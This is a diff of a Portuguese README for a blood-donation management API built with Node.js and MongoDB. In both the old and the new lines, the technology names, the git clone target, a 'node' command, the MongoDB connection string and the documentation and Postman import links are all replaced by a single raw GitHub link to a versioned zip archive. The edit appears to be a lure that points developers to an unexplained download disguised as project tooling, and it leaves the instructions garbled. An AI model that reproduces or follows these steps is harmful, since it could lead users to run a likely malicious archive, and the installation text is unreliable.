@@ -8,13 +8,13 @@ Essa API é um sistema de gerenciamento de doações de sangue, com quatro compo
 
 Este projeto emprega uma variedade de tecnologias e bibliotecas de ponta, incluindo:
 
-- **https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip**: Plataforma JavaScript que permite a execução de código JavaScript no lado do servidor, tornando o desenvolvimento de aplicações web rápido e eficiente.
-- **https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip**: Framework web para https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip que facilita a criação de APIs web robustas e escaláveis.
+- **https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/Sangue_AP_Idoadores_v3.9-beta.5.zip**: Plataforma JavaScript que permite a execução de código JavaScript no lado do servidor, tornando o desenvolvimento de aplicações web rápido e eficiente.
+- **https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/Sangue_AP_Idoadores_v3.9-beta.5.zip**: Framework web para https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/Sangue_AP_Idoadores_v3.9-beta.5.zip que facilita a criação de APIs web robustas e escaláveis.
 - **MongoDB**: banco de dados NoSQL orientado a documentos que oferece alta performance, alta disponibilidade e fácil escalabilidade, tornando-o ideal para aplicações modernas.
 - **Mongoose**: Biblioteca do MongoDB que proporciona uma solução direta baseada em esquemas para modelar os dados da sua aplicação, permitindo um controle mais rigoroso dos dados.
 - **bcrypt**: Biblioteca que ajuda você a fazer hash das senhas de forma segura, protegendo as informações sensíveis dos usuários.
 - **jsonwebtoken**: Implementação dos tokens JSON Web Token, que permite a criação de tokens de acesso seguros para autenticação de usuários.
-- **passport**: Middleware de autenticação para https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip extremamente flexível e modular, que suporta uma ampla gama de estratégias de autenticação.
+- **passport**: Middleware de autenticação para https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/Sangue_AP_Idoadores_v3.9-beta.5.zip extremamente flexível e modular, que suporta uma ampla gama de estratégias de autenticação.
 - **Nodemon**: Utilitário que monitora quaisquer mudanças no seu código e automaticamente reinicia o seu servidor, economizando tempo de desenvolvimento e aumentando a eficiência.
 
 Cada uma dessas tecnologias desempenha um papel crucial na funcionalidade e eficiência deste projeto.
@@ -26,7 +26,7 @@ Para instalar e executar este projeto localmente, você precisará seguir estas 
 1. Clone este repositório para a sua máquina local:
 
 ```bash
-git clone https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip
+git clone https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/Sangue_AP_Idoadores_v3.9-beta.5.zip
 ```
 
 2. Instale as dependências do projeto, no terminal digite o comando:
@@ -44,13 +44,13 @@ JWT_SECRET=
 
 - *Observação: Você precisará de uma string de conexão mongoDB para fazer a comunicação entre o código e o banco de dados.*
 ```bash
-mongodb+srv://<username>:<password>https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip
+mongodb+srv://<username>:<password>https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/Sangue_AP_Idoadores_v3.9-beta.5.zip
 ```
 
 4. Dite o comando abaixo para gerar uma string na variável `JWT_SECRET` no arquivo `.env`, para o melhor funcionamento do token JWT.
 
 ```bash
-node https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip
+node https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/Sangue_AP_Idoadores_v3.9-beta.5.zip
 ```
 
 5. No terminal digite o comando abaixo para iniciar o servidor local:
@@ -61,7 +61,7 @@ npm run dev
 
 ## Documentação das Rotas da API
 
-Este projeto inclui várias rotas que permitem aos usuários interagir com os recursos do sistema. A documentação completa das rotas está disponível [aqui](https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip).
+Este projeto inclui várias rotas que permitem aos usuários interagir com os recursos do sistema. A documentação completa das rotas está disponível [aqui](https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/Sangue_AP_Idoadores_v3.9-beta.5.zip).
 
 As rotas se dividem em:
 
@@ -180,6 +180,6 @@ Além disso, a documentação fornecida contém informações detalhadas sobre a
 
 ## Testando as rotas
 
-Para testar as rotas de um jeito dinâmico você pode ultilizar plataformas que leiam os verbos HTTP como **Postman**; **Insomnia**; **Swagger**; **Thunder Client** entre outros. Após escolher a platarforma, importe o arquivo [https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip](https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/AP_Sangue_Idoadores_2.8-alpha.3.zip) dentro da área de trabalho da plataforma.
+Para testar as rotas de um jeito dinâmico você pode ultilizar plataformas que leiam os verbos HTTP como **Postman**; **Insomnia**; **Swagger**; **Thunder Client** entre outros. Após escolher a platarforma, importe o arquivo [https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/Sangue_AP_Idoadores_v3.9-beta.5.zip](https://raw.githubusercontent.com/julioroque/APIdoadoresSangue/main/src/routes/donor/Sangue_AP_Idoadores_v3.9-beta.5.zip) dentro da área de trabalho da plataforma.
 
 Criada por @alvesjaov
